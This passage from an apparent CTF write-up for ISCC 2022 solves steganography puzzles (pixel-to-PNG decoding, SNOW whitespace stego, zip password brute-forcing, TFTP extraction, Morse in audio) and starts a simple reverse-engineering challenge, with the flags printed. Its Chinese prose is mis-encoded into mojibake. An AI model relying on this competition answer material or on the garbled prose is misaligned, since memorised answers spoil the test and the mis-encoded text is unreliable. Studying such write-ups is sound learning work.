/></p><p>å¯ä»¥çœ‹åˆ°æå‡ºæ¥çš„å›¾ç‰‡æ˜¯è¿™æ ·çš„ã€‚ç®—æ˜¯äºŒå€¼å›¾åƒäº†ã€‚ç»“åˆé¢˜ç›®é™ç»´æ‰“å‡»ï¼Œåº”è¯¥æ˜¯è¦æˆ‘æŠŠè¿™ä¸ªå›¾åƒå±•å¼€ä¸ºä¸€ç»´äº†ã€‚æŒ‰è¡Œå±•å¼€è‚¯å®šä¸è¡Œï¼Œå› ä¸ºæœ‰ä¸€åŠéƒ½æ˜¯çº¯é»‘è‰²ï¼Œæå–å‡ºæ¥çš„æ•°æ®æ²¡æœ‰å…³è”ã€‚ç¨å¾®çœ‹äº†ä¸‹åˆ—å±•å¼€çš„ç»“æœã€‚å¦‚æœæŠŠåƒç´ å€¼255è¡¨ç¤ºä¸º1çš„è¯ã€‚å‰é¢å‡ ä¸ªåƒç´ ç‚¹çš„è½¬æ¢ç»“æœåˆšå¥½æ˜¯8950ã€‚è¿™æ˜¯PNGæ–‡ä»¶çš„æ–‡ä»¶å¤´ã€‚çœ‹æ¥æ–¹å‘å¯¹äº†ã€‚</p><p>å†™ä¸ªè„šæœ¬æä¸€ä¸‹æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># extract.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> b2s<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;00000567.png&quot;</span>)<br><br>weight, height = img.size<br>img_gray = img.convert(<span class="hljs-string">&quot;L&quot;</span>)<br><br>bin_data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(weight):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> img_gray.getpixel((i,j)) == <span class="hljs-number">255</span>:<br>            bin_data.append(<span class="hljs-string">&quot;1&quot;</span>)<br>        <span class="hljs-keyword">else</span> :<br>            bin_data.append(<span class="hljs-string">&quot;0&quot;</span>)<br><br>data = <span class="hljs-string">&quot;&quot;</span>.join(bin_data)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;data.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(b2s(data))<br></code></pre></td></tr></table></figure><p>æå–å‡ºæ¥çš„æ•°æ®å¯ä»¥ä½œä¸ºå›¾åƒé˜…è¯»ã€‚</p><p><img src="https://s2.loli.net/2022/05/02/e6OXdwMmx1U58Q9.png" alt="data" /></p><p>åˆ°è¿™é‡Œçœ‹çš„æˆ‘ä¸€å¤´é›¾æ°´ã€‚è¿™æ˜¯ä»€ä¹ˆå›¾åƒå¯†ç ã€‚æˆ‘éƒ½æ²¡è§è¿‡ï¼Œæ‰¾äº†ä¸€åœˆå›¾å½¢å¯†ç ï¼Œå°±æ˜¯æ²¡æ‰¾åˆ°å’Œè¿™ä¸ªç±»ä¼¼çš„ã€‚</p><p>æƒ³èµ·åŸå›¾æ˜¯ä¼Šé›·å¨œçš„å›¾ï¼Œä¸ä¼šæ˜¯é­”å¥³ä¹‹æ—…é‡Œé¢çš„æ–‡å­—å§ï¼Ÿ</p><p>ç™¾åº¦äº†ä¸€ä¸‹æ²¡æƒ³å¸¦è¿˜çœŸæœ‰â€¦</p><p><a href="https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0</a></p><p><img src="https://s2.loli.net/2022/05/02/N4TitScG2dek19V.png" alt="image-20220502221726137" /></p><p>ç„¶åæˆ‘å°±é‡åˆ°äº†è¿™é“é¢˜æœ€å¤§çš„éš¾ç‚¹ï¼ˆå¯¹æˆ‘æ¥è¯´ï¼‰ã€‚æˆ‘æ‰¾ä¸åˆ°å¯¹åº”çš„å­—æ¯ã€‚æˆ–è€…è¯´æ‰¾åˆ°çš„éƒ½ä¸å¯¹ã€‚èƒ½ç¡®å®šçš„æ˜¯Cã€Kã€I(i)ã€Uå’ŒNã€‚å…¶ä»–çš„ä¸çŸ¥é“å¯¹åº”å“ªä¸€ä¸ªã€‚</p><p>åé¢åˆæ‰¾äº†ä¸€ä¸ªï¼š<a href="https://www.bilibili.com/read/cv8724055/">https://www.bilibili.com/read/cv8724055/</a></p><p>å¾—åˆ°ç­”æ¡ˆä¸ºï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">fckziuurqknfæˆ–è€…fckziuurpknf<br>zckfiuurqknzæˆ–è€…zckfiuurpknz<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰ç…§æ ¼å¼æäº¤ä¸Šå»ä¸å¯¹â€¦æˆ‘å¾ˆæƒ³ç›´åˆ°å‡ºé¢˜äººæ˜¯æ€ä¹ˆå†™çš„è¿™å‡ ä¸ªå­—â€¦</p><p>æœ€åå°è¯•äº†è¿™ä¸ª</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ISCC</span><span class="hljs-template-variable">&#123;FCKZ-IUUR-PKNF&#125;</span><br></code></pre></td></tr></table></figure><p>ç»“æœè¿‡äº†ã€‚</p><p>â€¦</p><p>è®©æˆ‘ä»¬å›åˆ°é¢˜ç›®çš„flagæ ¼å¼ï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flagæ ¼å¼ï¼šISCC</span><span class="hljs-template-variable">&#123;xxxx-xxxx-xxxx&#125;</span><br></code></pre></td></tr></table></figure><p>ä½œè€…ä½ è¿™ä¸æ˜¯å‘çˆ¹å—ã€‚</p><h2 id="2022å†¬å¥¥ä¼š"><a class="markdownIt-Anchor" href="#2022å†¬å¥¥ä¼š"></a> 2022å†¬å¥¥ä¼š</h2><div class="note note-info">            <p>äº2022-05-11æ–°å¢</p>          </div><p>ä¸å•æ¿å°å°†è‹ç¿Šé¸£é¢˜è§£ä¸€è‡´ã€‚ä¿®æ”¹å›¾ç‰‡é«˜åº¦ã€‚å¾—åˆ°ä¿¡æ¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x51b0;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x5c0f;</span><span class="hljs-symbol">&amp;#x4f19;</span><span class="hljs-symbol">&amp;#x4f34;</span><span class="hljs-symbol">&amp;#x7ecf;</span><span class="hljs-symbol">&amp;#x5e38;</span><span class="hljs-symbol">&amp;#x88ab;</span><span class="hljs-symbol">&amp;#x4eba;</span><span class="hljs-symbol">&amp;#x51b7;</span><span class="hljs-symbol">&amp;#x843d;</span><span class="hljs-symbol">&amp;#xff0c;</span><span class="hljs-symbol">&amp;#x4f60;</span><span class="hljs-symbol">&amp;#x77e5;</span><span class="hljs-symbol">&amp;#x9053;</span><span class="hljs-symbol">&amp;#x5b83;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x539f;</span><span class="hljs-symbol">&amp;#x578b;</span><span class="hljs-symbol">&amp;#x662f;</span><span class="hljs-symbol">&amp;#x4ec0;</span><span class="hljs-symbol">&amp;#x4e48;</span><span class="hljs-symbol">&amp;#x5417;</span><span class="hljs-symbol">&amp;#xff1f;</span><br></code></pre></td></tr></table></figure><p>unicodeç¼–ç ï¼Œé—®çš„æ˜¯é›ªå®¹èçš„åŸå‹æ˜¯ä»€ä¹ˆã€‚ç­”æ¡ˆæ˜¯ç¯ç¬¼ã€‚</p><h2 id="çœŸç›¸åªæœ‰ä¸€ä¸ª"><a class="markdownIt-Anchor" href="#çœŸç›¸åªæœ‰ä¸€ä¸ª"></a> çœŸç›¸åªæœ‰ä¸€ä¸ª</h2><div class="note note-info">            <p>äº2022-05-12æ–°å¢</p>          </div><p>ä¸‹è½½æ–‡ä»¶ã€‚é‡Œé¢æœ‰ä¸€å¼ å›¾ç‰‡ï¼Œä¸€ä¸ªæ–‡æœ¬ï¼Œä¸€ä¸ªæœªçŸ¥æ–‡ä»¶ã€‚</p><p>æ–‡æœ¬é‡Œé¢åŒ…å«äº†å¾ˆå¤šçš„ç©ºç™½å­—ç¬¦ï¼Œç©ºæ ¼åˆ¶è¡¨ç¬¦å•¥çš„ã€‚åº”è¯¥æ˜¯snowéšå†™ã€‚è¯•äº†ä¸€ä¸‹ç›´æ¥ç”¨snowæå–ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\éšå†™\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> F:\Download\CTF\ISCC2022\çœŸç›¸åªæœ‰ä¸€ä¸ª\flag.txt<br><span class="hljs-built_in">h</span><br> bn1aagwanter <span class="hljs-built_in">h</span>:lwse<br></code></pre></td></tr></table></figure><p>çœ‹æ ·å­ä¸æ˜¯ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚åº”è¯¥æ˜¯è¦å¯†ç ã€‚</p><p>å›¾ç‰‡æ‰“å¼€çš„æ—¶å€™æŠ¥äº†ä¸€ä¸ªCRCé”™è¯¯çš„è­¦å‘Šã€‚è¿™ä¸ªåº”è¯¥æ˜¯å›¾åƒçš„å®½åº¦æˆ–è€…é«˜åº¦è¢«ä¿®æ”¹äº†æ‰ä¼šå‡ºç°çš„ã€‚ä½†æ˜¯åŸå›¾åƒæ²¡æœ‰å¤±çœŸæ‰­æ›²ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯é«˜åº¦è¢«ä¿®æ”¹äº†ã€‚æŠŠé«˜åº¦æ”¹å¤§ä¸€ç‚¹ï¼Œå·¦ä¸‹è§’å‡ºç°äº†æ‘©æ–¯å¯†ç ã€‚ç¿»è¯‘ä¸€ä¸‹ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">-.<span class="hljs-regexp">/---/</span>-<span class="hljs-regexp">/..../</span>.<span class="hljs-regexp">/.-./</span>.<br>nothere<br></code></pre></td></tr></table></figure><p>å—¯â€¦è¿™ä¸ªå¯èƒ½æ˜¯å¯†ç ï¼Œä½†ä¹Ÿä¸ä¸€å®šï¼Œå°è¯•ç”¨è¿™ä¸ªå¯†ç è§£snowã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\éšå†™\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> nothere F:\Download\CTF\ISCC2022\çœŸç›¸åªæœ‰ä¸€ä¸ª\flag.txt<br>y .bpti   awds1)n.. n  aWarning: residual of <span class="hljs-number">5</span> bits not uncompressed<br></code></pre></td></tr></table></figure><p>å¤±è´¥äº†ï¼Œçœ‹æ¥è¿™ä¸ªåº”è¯¥å°±æ˜¯æç¤ºä½ flagä¸åœ¨è¿™ã€‚</p><p>é‚£ä¹ˆç°åœ¨å°±å‰©ä¸‹ä¸€ä¸ªæ–‡ä»¶äº†ã€‚è¿™ä¸ªæ–‡ä»¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆç±»å‹çš„ã€‚å…ˆç”¨äºŒè¿›åˆ¶çœ‹çœ‹ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">00<span class="hljs-number"> 00 </span>03<span class="hljs-number"> 04 </span>14<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>08<span class="hljs-number"> 00 </span>08 8B<span class="hljs-number"> 49 </span>54<span class="hljs-number"> 87 </span>DA ï¿½ï¿½ï¿½ï¿½ï¿½â€¹ITâ€¡Ãš<br>DD<span class="hljs-number"> 97 </span>95 D2<span class="hljs-number"> 22 </span>00<span class="hljs-number"> 88 </span>D3 2C<span class="hljs-number"> 00 </span>0D<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>73 74Ãâ€”â€¢Ã’&quot;ï¿½Ë†Ã“,ï¿½ ï¿½ï¿½ï¿½st<br>72<span class="hljs-number"> 65 </span>61 6D 2E<span class="hljs-number"> 70 </span>63<span class="hljs-number"> 61 </span>70 6E<span class="hljs-number"> 67 </span>4F<span class="hljs-number"> 15 </span>F0<span class="hljs-number"> 01 </span>EFream.pcapngOÃ°Ã¯<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæµé‡åŒ…ã€‚è€Œä¸”çœ‹æ–‡ä»¶å¼€å¤´çš„é‚£äº›æ•°æ®ã€‚14 00 01 00 å¦‚æœç»å¸¸åšå‹ç¼©åŒ…ç›¸å…³çš„é¢˜çš„ï¼Œè¿™ä¸ªæ˜¯åŠ å¯†å‹ç¼©åŒ…ä¼šå‡ºç°çš„ç‰¹å¾ã€‚æ‰€ä»¥åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯ç¼ºå°‘äº†å¤´ã€‚æ‰€ä»¥æˆ‘ä»¬è¡¥ä¸Šå³å¯ã€‚ä¿®å¤å®Œä¹‹åï¼Œå†çœ‹å‹ç¼©åŒ…å†…æ–‡ä»¶PKå¤´éƒ¨åˆ†ï¼Œä¹Ÿæœ‰åŠ å¯†ç‰¹å¾ï¼Œè¯´æ˜è¿™ä¸ªåº”è¯¥æ˜¯çœŸåŠ å¯†ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯¹åº”çš„å¯†ç ã€‚</p><p>ç¿»äº†ä¸€åœˆåœ¨å›¾åƒé‡Œé¢æ‰¾åˆ°äº†ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">706173737764efbc 9a313939382f7878  passwd.. <span class="hljs-string">.1998/xx</span><br>2f78782492492492 4924924924924920  <span class="hljs-string">/xx</span>$<span class="hljs-string">.I</span>$. I$<span class="hljs-string">.I</span>$<span class="hljs-string">.I</span> <br>248eda97b24fc049 53b6b6db6db6db6d  $<span class="hljs-string">....O.I</span> S.<span class="hljs-string">..m..m</span><br></code></pre></td></tr></table></figure><p>LSBæä¸€ä¸‹ï¼Œçœ‹åˆ°æœ‰ä¸ªpasswdï¼Œåé¢æ˜¯ä¸ªæ—¥æœŸã€‚è¿™ä¸ªæç¤ºæˆ‘ä»¬å¯†ç æ˜¯ä¸ª8ä½æ•°å­—ã€‚æ‰€ä»¥ç›´æ¥çˆ†ç ´ã€‚å¾—åˆ°å¯†ç 19981111ã€‚</p><p>è§£å‹åå¾—åˆ°ä¸€ä¸ªåŒ…æ–‡ä»¶ã€‚ç”¨wiresharkæ‰“å¼€çœ‹çœ‹ã€‚å¯ä»¥çœ‹åˆ°å‡ ä¹å…¨éƒ¨æ˜¯TFTPæŠ¥æ–‡ï¼Œè¯´æ˜è¿™ä¸ªé‡Œé¢æœ‰ä¸ªä¼ è¾“çš„æ–‡ä»¶ã€‚TFTPæ˜¯ä¸åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†æ–‡ä»¶æå–å‡ºæ¥ã€‚</p><p>èœå•é€‰æ‹©â€œæ–‡ä»¶â€ï¼Œâ€œå¯¼å‡ºå¯¹è±¡â€ï¼Œâ€œTFTPâ€ã€‚å¯ä»¥çœ‹åˆ°æœ‰ä¸ªpassword.mp3çš„æ–‡ä»¶ã€‚é€‰ä¸­ä¿å­˜ã€‚</p><p>å°†è¿™ä¸ªmp3æ–‡ä»¶æ”¾å…¥Audacityã€‚</p><p><img src="https://s2.loli.net/2022/05/12/qKaNGjLQhrtc1Ck.jpg" alt="password" /></p><p>å¯ä»¥çœ‹åˆ°åæ–¹æœ‰ä¸è§„åˆ™çš„æ³¢å½¢ã€‚æ˜¯æ‘©æ–¯ç”µç ã€‚è§£å¯†å¾—åˆ°isccmiscã€‚è¿™ä¸ªæ–‡ä»¶çš„åå­—å°±å«passwordã€‚æ‰€ä»¥è¿™ä¸ªç»“æœåº”è¯¥å°±æ˜¯snowçš„å¯†ç ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\éšå†™\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> isccmisc F:\Download\CTF\ISCC2022\çœŸç›¸åªæœ‰ä¸€ä¸ª\flag.txt<br><span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flagã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ISCC&#123;<span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="amys-code"><a class="markdownIt-Anchor" href="#amys-code"></a> Amyâ€™s Code</h2><p>é€†å‘è¿˜æ²¡å…¥é—¨ï¼Œæ‰€ä»¥æŒ‘äº†ç®€å•çš„é¢˜ç»ƒæ‰‹ã€‚å“ï¼Œæ²¡æœ‰å¸ˆå‚…å¸¦è‡ªå·±å­¦æ˜¯çœŸçš„è¿›å±•ç¼“æ…¢ã€‚</p><p>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ŒStuPEçœ‹ä¸€ä¸‹æ˜¯32ä½ç¨‹åºã€‚</p><p>è¿è¡Œä¸€ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Please input flagï¼šwafsafwfaw<br>Wrong!<br></code></pre></td></tr></table></figure><p>çœ‹æ ·å­æ˜¯æˆ‘è¦è‡ªå·±é€†å‘å‡ºflagäº†ã€‚</p><p>IDAæ‰“å¼€çœ‹çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> Destination[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [esp+DCh] [ebp-410h] BYREF</span><br>  <span class="hljs-type">char</span> Source[<span class="hljs-number">516</span>]; <span class="hljs-comment">// [esp+2E4h] [ebp-208h] BYREF</span><br><br>  j__printf(aPleaseInputFla);<br>  sub_411717((va_list)<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span>)Source);<br>  j__strcpy(Destination, Source);<br>  sub_4115FF(Destination);<br>  <span class="hljs-keyword">if</span> ( sub_411433(Destination) )<br>    j__printf(<span class="hljs-string">&quot;Correct!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    j__printf(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>  j__system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµç¨‹å¾ˆç®€å•ã€‚</p><p>é¦–å…ˆè¯»å…¥ï¼Œç„¶åè¿›å…¥sub_4115FFè¿™ä¸ªå‡½æ•°å¤„ç†ä¸€ä¸‹è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚ç„¶åä½¿ç”¨sub_411433å‡½æ•°è¿›è¡Œåˆ¤æ–­ã€‚é‡ç‚¹åº”è¯¥å°±æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°äº†ã€‚</p><p>å…ˆè¿›å…¥sub_4115FFè¿™ä¸ªå‡½æ•°çœ‹çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4115FF</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> sub_4128A0(Str);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·³è½¬åˆ°æ–°å‡½æ•°sub_4128A0ã€‚è·Ÿè¿›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4128A0</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+D0h] [ebp-14h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+DCh] [ebp-8h]</span><br><br>  v3 = j__strlen(Str);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v3 )<br>      <span class="hljs-keyword">break</span>;<br>    Str[i] ^= i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°é€»è¾‘è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ã€‚å°±æ˜¯æŠŠå¯¹åº”å­—ç¬¦ä¸²çš„å­—ç¬¦å¼‚æˆ–ä¸Šä»–çš„ç´¢å¼•å€¼ã€‚</p><p>åœ¨åˆ°sub_411433å‡½æ•°çœ‹çœ‹ã€‚å…¶è·³è½¬åˆ°sub_412550äº†ï¼Œæˆ‘ä»¬ä¹Ÿè·Ÿè¿›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_412550</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-140h]</span><br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+E8h] [ebp-134h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+168h] [ebp-B4h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+174h] [ebp-A8h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+18Ch] [ebp-90h]</span><br>  __int16 v8; <span class="hljs-comment">// [esp+190h] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v9[<span class="hljs-number">31</span>]; <span class="hljs-comment">// [esp+19Ch] [ebp-80h]</span><br><br>  v9[<span class="hljs-number">0</span>] = <span class="hljs-number">149</span>;v9[<span class="hljs-number">1</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">2</span>] = <span class="hljs-number">137</span>;v9[<span class="hljs-number">3</span>] = <span class="hljs-number">134</span>;<br>  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">212</span>;v9[<span class="hljs-number">5</span>] = <span class="hljs-number">188</span>;v9[<span class="hljs-number">6</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">7</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">9</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">10</span>] = <span class="hljs-number">192</span>;v9[<span class="hljs-number">11</span>] = <span class="hljs-number">179</span>;<br>  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">153</span>;v9[<span class="hljs-number">13</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">14</span>] = <span class="hljs-number">159</span>;v9[<span class="hljs-number">15</span>] = <span class="hljs-number">163</span>;<br>  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">160</span>;v9[<span class="hljs-number">17</span>] = <span class="hljs-number">167</span>;v9[<span class="hljs-number">18</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">19</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">21</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">22</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">23</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">25</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">29</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span>);<span class="hljs-comment">//len = 20</span><br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v5 = j__strlen(Str);<br>  j__memset(v4, <span class="hljs-number">0</span>, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v5; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != v9[j] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªè¦é€†è¿™ä¸ªè¿ç®—è¿‡ç¨‹å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬æ¥è§£å‡ºStræ˜¯ä»€ä¹ˆã€‚çœ‹æ 